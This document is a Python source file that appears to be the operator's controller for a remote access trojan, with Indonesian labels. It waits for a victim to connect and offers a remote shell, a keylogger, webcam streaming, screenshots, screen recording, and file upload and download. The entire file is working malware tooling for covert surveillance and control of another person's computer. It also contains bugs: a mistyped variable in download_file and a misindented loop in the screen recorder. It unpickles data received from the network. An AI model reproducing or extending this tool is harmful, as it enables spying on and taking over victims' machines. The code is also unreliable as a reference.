import socket
import json
import os
import struct
import pickle
import cv2
import threading

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(('192.168.18.210', 9999))
print('[+] Menunggu koneksi...')
soc.listen(1)

koneksi = soc.accept()
_target = koneksi[0]
ip = koneksi[1]
print(_target)
print(f'[+] Terhubung ke {str(ip)}')
def konversi_byte_screen_recorder():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.bind(('192.168.18.210', 9997))
     sock.listen(1)
     konek = sock.accept()
     tg = konek[0]
     ip = konek[1]

     bdata = b""
     payload_size = struct.calcsize("i")

     while True:
          while(len(bdata)) < payload_size: 
               packet = tg.recv(1024)
               if not packet: break
               bdata += packet

               packed_msg_size = bdata[:payload_size]
               bdata = bdata[payload_size:]
               msg_size = struct.unpack("i", packed_msg_size)[0]
               while len(bdata) < msg_size:
                    bdata += tg.recv(1024)
               frame_data = bdata[:msg_size]
               bdata =  bdata[msg_size:]
               frame = pickle.loads(frame_data)
               cv2.imshow("recording", frame)
               key = cv2.waitKey(1)
               if key == 27:
                    break
          tg.close()
          cv2.destroyAllWindows()

def record_screen():
     t = threading.Thread(target=konversi_byte_screen_recorder)
     t.start()

def konversi_byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.bind(('192.168.18.210', 9998))
     sock.listen(1)
     konek = sock.accept()
     tg = konek[0]
     ip = konek[1]

     bdata = b""
     payload_size = struct.calcsize("Q")
     while True:
          while(len(bdata)) < payload_size:
               packet = tg.recv(4*1024)
               if not packet: break
               bdata += packet

          packed_msg_size = bdata[:payload_size]
          bdata = bdata[payload_size:]
          msg_size = struct.unpack("Q", packed_msg_size)[0]
          while len(bdata) < msg_size:
               bdata += tg.recv(4*1024)
          frame_data = bdata[:msg_size]
          bdata =  bdata[msg_size:]
          frame = pickle.loads(frame_data)
          cv2.imshow("streaming", frame)
          key = cv2.waitKey(1)
          if key == 27:
               break
     tg.close()
     cv2.destroyAllWindows()

def stream_cam():
     t = threading.Thread(target=konversi_byte_stream)
     t.start()

def upload_file(namafile):
     file = open(namafile, 'rb')
     _target.send(file.read())
     file.close()

def download_file(namafile):
     file = open(namafile, 'wb')
     _target.settimeout(1)
     _file = _target.recv(4096)
     while _file:
          file.write(_file)
          try:
               file = _target.recv(4096)
          except socket.timeout as e:
               break
     _target.settimeout(None)
     file.close()

def data_diterima():
        data = ''
        while True:
            try:
                data = data + _target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                 continue

def shellc():
    n = 0
    while True:
        perintah = input('jashell << ')
        data = json.dumps(perintah)
        _target.send(data.encode())
        if perintah in('exit','quit'):
             break
        elif perintah == 'clear':
             os.system('clear')
        elif perintah[:3] == 'cd ':
             pass
        elif perintah[:8] == 'download':
             download_file(perintah[9:])
        elif perintah[:6] == 'upload':
             upload_file(perintah[7:])
        elif perintah == 'start_log':
             pass
        elif perintah == 'baca_log':
             data = _target.recv(1024).decode()
             print(data)
        elif perintah == 'stop_log':
             pass
        elif perintah == 'start_cam':
             stream_cam()
        elif perintah ==  'screensh':
             n += 1
             file = open("ss"+str(n)+".png", 'wb')
             _target.settimeout(3)
             _file = _target.recv(1024)
             while _file:
                  file.write(_file)
                  try:
                       _file = _target.recv(1024)
                  except socket.timeout as e:
                       break
             _target.settimeout(None)
             file.close()
        elif perintah == 'screensr':
             record_screen()
        elif perintah == 'help':
             print("""
                   -exit/quit >> keluar
                   -clear     >> bersihkan terminal
                   -download  >> mendownload file
                   -upload    >> mengupload file
                   -start_log >> memulai keylogger
                   -baca_log  >> membaca hasil keylogger
                   -stop_log  >> menghentikan keylogger
                   -start_cam >> mengakses kamera
                   -screensh  >> screenshot layar
                   -screensr  >> berbagi layar
                   """)                 
        else:
             hasil = data_diterima()
             print(hasil)

shellc()